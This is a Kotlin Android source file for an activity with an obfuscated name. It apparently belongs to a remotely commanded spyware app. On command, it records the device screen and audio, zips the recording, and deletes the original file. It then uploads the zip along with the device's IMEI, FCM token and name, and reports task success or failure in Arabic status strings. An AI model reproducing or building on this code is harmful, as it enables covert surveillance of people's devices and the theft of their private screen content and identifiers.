package com.example.mobiletwo

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.util.SparseIntArray
import android.view.Surface
import com.example.mobiletwo.Consts.Companion.sFiles
import com.example.mobiletwo.MyExecutorFG.Companion.zipLocalFile
import com.example.mobiletwo.MyFireBaseMessagingService.Companion.dSPRead
import java.io.File


class Buguo3anucb : Activity() {
    init {
         instance = this
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        doCont()
        setContentView(R.layout.activity_ckpuhwom)
        ri=intent.getIntExtra("ri", 0)
        command = intent.getStringExtra("command")?:""
        mOrientations.append(Surface.ROTATION_0,90)
        mOrientations.append(Surface.ROTATION_90,0)
        mOrientations.append(Surface.ROTATION_180,270)
        mOrientations.append(Surface.ROTATION_270,180)

        val mMetrics= resources.displayMetrics
        //windowManager.defaultDisplay.getMetrics(mMetrics)

        mDpi=mMetrics.densityDpi
        mWidth=mMetrics.widthPixels
        mHeight=mMetrics.heightPixels
        mMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(baseContext)
        }else{
            MediaRecorder()
        }
        //mMediaRecorder.setMaxDuration(1*60*1000)//1min*sec*milli
        //mMediaRecorder.setMaxFileSize(1*1024*1024)//1MB*KB*B
        mMediaRecorder!!.setOnInfoListener(MOnInfoListener)
        mMediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        println("Ready to record")
        try {
            stopRecording()
        }catch (ex:Exception){/*just to clear and reset media recorder!*/}
        initRecorder()
        startRecording()
    }

    object MOnInfoListener : MediaRecorder.OnInfoListener {
        override fun onInfo(p0: MediaRecorder?, p1: Int, p2: Int) {
            if (p1== MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                p0?.stop()
                p0?.reset()
                stopRecording()

                return
            }
            if (p1 == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED){
                p0?.stop()
                p0?.reset()
                stopRecording()
                return
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        try {
            if (data == null) {
                finishAffinity()
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                }.start()
                return
            }
            if (requestCode != 123 || resultCode != RESULT_OK) {
                return
            }
            mMediaProjection = mMediaProjectionManager?.getMediaProjection(resultCode, data!!)
            mVirtualDisplay = mMediaProjection?.createVirtualDisplay(
                "ScreenRecorder", mWidth, mHeight, mDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder?.surface, null, null
            )
            mMediaRecorder?.start()
            finishAffinity()
        }catch (ex:Exception) {
            MyExecutorFG.writeError(ex)
            Log.i("onActivityResult", ex.message?:"")
            ex.printStackTrace()
            finishAffinity()
            Thread {
                MyApiOld.resp(
                    ri.toString(), "فشل المهمه", "", "", "5",
                    command, "", dSPRead.getString("imei", "") ?: ""
                )
            }.start()
        }
    }



    private fun initRecorder() {
        mMediaRecorder?.setAudioSource(MediaRecorder.AudioSource.DEFAULT)
        mMediaRecorder?.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mMediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mMediaRecorder?.setVideoSize(mWidth, mHeight)
        mMediaRecorder?.setVideoFrameRate(30)
        mMediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        mMediaRecorder?.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        File("${sFiles.absolutePath}/Records/").mkdirs()
        mPath=("${sFiles.absolutePath}/Records/Record_${System.currentTimeMillis()}.mp4")
        mMediaRecorder?.setOutputFile(mPath)
        mMediaRecorder?.setVideoEncodingBitRate(500*1000)
        val rotation: Int = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            baseContext.display!!.rotation
        }else {
            windowManager.defaultDisplay.rotation
        }
        val mOrientation = mOrientations.get(rotation + 90)
        mMediaRecorder?.setOrientationHint(mOrientation)
        mMediaRecorder?.setMaxDuration(Consts.MaxVideoRecordTime*60*1000)//1min*sec*milli
        mMediaRecorder?.setMaxFileSize((Consts.MaxVideoSizeMega*1024*1024).toLong())//1MB*KB*B
        mMediaRecorder?.setOnInfoListener(MOnInfoListener)
        Thread.sleep(1000)
        mMediaRecorder?.prepare()
//        var prepared = false
//        var tries = 0
//        while (!prepared && tries<9){
//            prepared = try {
//                tries++
//                mMediaRecorder?.prepare()
//                Thread.sleep(500)
//                true
//            }catch (ex:Exception){
//                println("!prepared: ${ex.message}")
//                ex.printStackTrace()
//                false
//            }
//        }
    }
    private fun startRecording() {
        if (mMediaProjection == null) {
            startActivityForResult(mMediaProjectionManager?.createScreenCaptureIntent(), 123)
            return
        }
        if (mWidth==0){mWidth=512}
        if (mHeight==0){mHeight=1024}
        if (mDpi==0){mDpi=160}
        mVirtualDisplay = mMediaProjection?.createVirtualDisplay("ScreenRecord", mWidth, mHeight, mDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder?.surface, null, null)
        //Thread.sleep(1000)
        mMediaRecorder?.start()
    }

    companion object {
        lateinit var instance :Buguo3anucb
        private var mDpi:Int =0
        private var mWidth:Int =0
        private var mHeight:Int =0
        private var mMediaProjectionManager: MediaProjectionManager? = null
        private var mMediaProjection: MediaProjection? = null
        var mVirtualDisplay: VirtualDisplay? = null
        private var mMediaRecorder: MediaRecorder? = null
        private var mOrientations: SparseIntArray = SparseIntArray()
        private var command = ""
        private var ri = 0
        private var mPath=""
        fun doCont(): Context? {
            return instance.applicationContext
        }
        fun stopRecording() {
            try {
                mVirtualDisplay?.release()
                mMediaProjection?.stop()
                mMediaProjection=null
                val comped = zipLocalFile(arrayListOf(mPath), mPath.replace(".mp4", ".zip"))
                File(mPath).delete()
                Log.i("Done", "True")
                Thread {
                    Log.i("Thread", "Started")
                    MyApiOld.conan(
                        ri.toString(),
                        dSPRead.getString("FCMToken", "") ?: "",
                        command,
                        dSPRead.getString("mDeviceName", "") ?: "",
                        comped,
                        File(comped).name,
                        "images",
                        dSPRead.getString("imei", "") ?: "",
                        null,
                        null,
                        true
                    )
                    MyApiOld.resp(
                        ri.toString(), "المهمه مكتمله", "", "", "3",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                    val x=doCont()!!
                    MyForeGroundService.stopService(x)
                }.start()
            }catch (ex:Exception){
                MyExecutorFG.writeError(ex)
                Log.i("stopRecordingConan", ex.message?:"")
                ex.printStackTrace()
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                    val x=doCont()!!
                    MyForeGroundService.stopService(x)
                }.start()
            }
        }
    }

}


